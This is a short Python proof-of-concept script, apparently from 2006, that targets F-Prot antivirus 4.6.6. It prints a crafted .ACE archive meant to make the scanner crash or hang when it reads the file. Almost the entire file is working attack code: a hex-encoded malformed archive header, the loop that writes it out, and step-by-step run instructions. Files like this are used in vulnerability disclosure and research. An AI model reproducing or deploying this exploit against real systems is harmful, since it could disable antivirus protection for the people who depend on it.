# fprot1.py - trivial proof of concept code for F-Prot 4.6.6 .ACE DoS
#
# Copyright (c) 2006 Evgeny Legerov
#
# Permission to use, copy, modify, and distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
# ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
# ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
# OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
#
# To test this code on Linux:
#
# create ACE compressed file
# $ ./fprot1.py > 1.ace
# $ f-prot 1.ace

import sys
import struct

ACE="""
 58 c5 31 00 00 00 90 2a 2a 41 43 45 2a 2a 14 14
 02 00 31 12 82 33 b6 45 97 7d 00 00 00 00 16 2a
 55 4e 52 45 47 49 53 54 45 52 45 44 20 56 45 52
 53 49 4f 4e 2a 6c 28 2c 00 01 01 00 d0 ff ff ff
 00 00 00 00 41 42 43 44 41 42 43 44 00 00 00 00
 02 05 41 41 41 41 0d 00 41 41 41 41 41 41 41 41
 41 41 41 41 41
"""

s = ""
for i in [chr(int(i, 16)) for i in ACE.split(" ") if len(i.strip()) > 0]:
        s += i

sys.stdout.write(s)

